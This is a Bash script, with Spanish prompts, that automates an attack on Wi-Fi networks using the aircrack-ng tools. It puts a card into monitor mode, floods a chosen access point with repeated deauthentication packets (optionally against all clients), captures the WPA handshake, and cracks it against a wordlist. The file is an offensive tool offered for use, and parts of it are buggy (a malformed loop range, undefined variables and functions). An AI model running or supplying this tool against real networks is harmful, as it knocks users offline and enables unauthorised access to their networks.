#!/usr/bin/bash

# Author: clhore

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
	tput cnorm; airmon-ng stop "${networkCard}mon" > /dev/null 2>&1
	exit 0
}

function dependencies(){
	tput civis
	clear; dependencies=(xterm aircrack-ng)

	echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"
	sleep 2

	for program in "${dependencies[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}"

		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ]; then
			echo -e " ${greenColour}(V)${endColour}"
		else
			echo -e " ${redColour}(X)${endColour}\n"
			echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
			if [ "$systemUser" == "arch" ]; then
				pacman -S --noconfirm $program > /dev/null 2>&1

			elif [ "$systemUser" == "debian" ] || [ "$systemUser" == "ubuntu" ]; then
				apt-get install $program -y > /dev/null 2>&1
			else
				echo -e "${redColour}:: Error en la verificacion de tu sistema operativo${endColour}"
				ctrl_c	
			fi
		fi; sleep 1
	done
}

function interfaceModeMonitor(){
	clear; echo -en "${yellowColour}Network card: ${endColour}" && read networkCard
	sleep 1; echo -e "${readColour}::${endColour} ${grayColour}Configurando netword cart${endColour}"
	airmon-ng start $networkCard > /dev/null 2>&1
	sleep 1; echo -e "${readColour}::${endColour} ${grayColour}Network cart modo monitor${endColour}"
}

function attackDOS(){
	xterm -hold -e "airodump-ng ${networkCard}mon" 2> /dev/null &
	xtermAirodumpPID=$!
	
	echo -en "\t${yellowColour}BSSID: ${endColour}" && read BSSID
	echo -en "\t${yellowColour}Channel: ${endColour}" && read CH
	sleep 1; kill -9 $xtermAirodumpPID; wait $xtermAirodumpPID 2>/dev/null 

	xterm -hold -e "airodump-ng --bssid $BSSID --channel $CH --write Captura ${networkCard}mon" 2>/dev/null &
	xtermAirodump_AP_PID=$!; sleep 1
	
	echo -en "\t${yellowColour}De-autenticación GLOBAL (y/n): ${endColour}" && read mode

	if [ "$mode" == "y" ]; then	
		ST='FF:FF:FF:FF:FF:FF'
	else
		echo -en "\t${yellowColour}STATYON: ${endColour}" && read ST
	fi
	
	echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read numS; sleep 1
	echo -en "\t${yellowColour}Intervalo (s): ${endColour}" && read numSI; sleep 1
	echo -en "\t${yellowColour}Numero de veces: ${endColour}" && read num; sleep 1

	for i in {1.. ..$num}; do
		xterm -hold -e "aireplay-ng -0 10 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
        	xtermAireplayPIB=$!
		
		sleep $numS; kill -9 $xtermAireplayPIB; wait $xtermAireplayPIB 2>/dev/null; sleep $numSI
	done

	sleep 20; kill -9 $xtermAirodump_AP_PID; wait $xtermAirodump_AP_PID 2>/dev/null
	echo -en "\t${yellowColour}Crack [Handshake] (y/n): ${endColour}" && read mode
	echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic
        
	if [ "$mode" == "y" ]; then
                xterm -hold -e "aircrack-ng -w $ruteDic -b $BSSID  Captura-01.cap" 2>/dev/null&
        else
                ctrl_c
        fi
	sleep 1; echo -en "\t${yellowColour}Eliminar captura (y/n): ${endColour}" && read capOPT
	sleep 1 

	if [ "$capOPT" == "y" ]; then
		rm Captura* 2>/dev/null
		sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Capturas borradas${endColour}"
	fi
	sleep 1; ctrl_c
}

function attackPMKID(){
	echo "PMKID"
}

#echo "XTerm*selectToClipboard: true" > ~/.Xresources
#xrdb -merge ~/.Xresources

# main function
if [ "$(id -u)" == "0" ]; then
	declare -i counter=0; while getopts ":h:" arg; do
                case $arg in
                        h) helpPanel;;
                esac
	done
	
	echo -ne "${yellowColour}[*] Sistema operativo [arch/debian/ubuntu]: ${endColour}" & read systemUser
	sleep 1

	if [ "$systemUser" == "arch" ] || [ "$systemUser" == "debian" ] || [ "$systemUser" == "ubuntu" ]; then
		clear; dependencies		
		interfaceModeMonitor; echo -ne "\n${yellowColour}[*] Modo de ataque (DOS/PMKID): ${endColour}" & read attackMode
		if [ "$attackMode" == "DOS" ]; then
			attackDOS
		elif [ "$attackMode" == "PMKID" ]; then 
			attackPMKID
		else
			echo -e "${redColour}:: Modo de ataque no valido${endColour}"
			ctrl_c
		fi
	else
		echo -e "${redColour}:: Error en la verificacion de tu sistema operativo${endColour}"
	fi
else
	echo -e "${redColour}Ejecute el script como root${endColour}"
fi
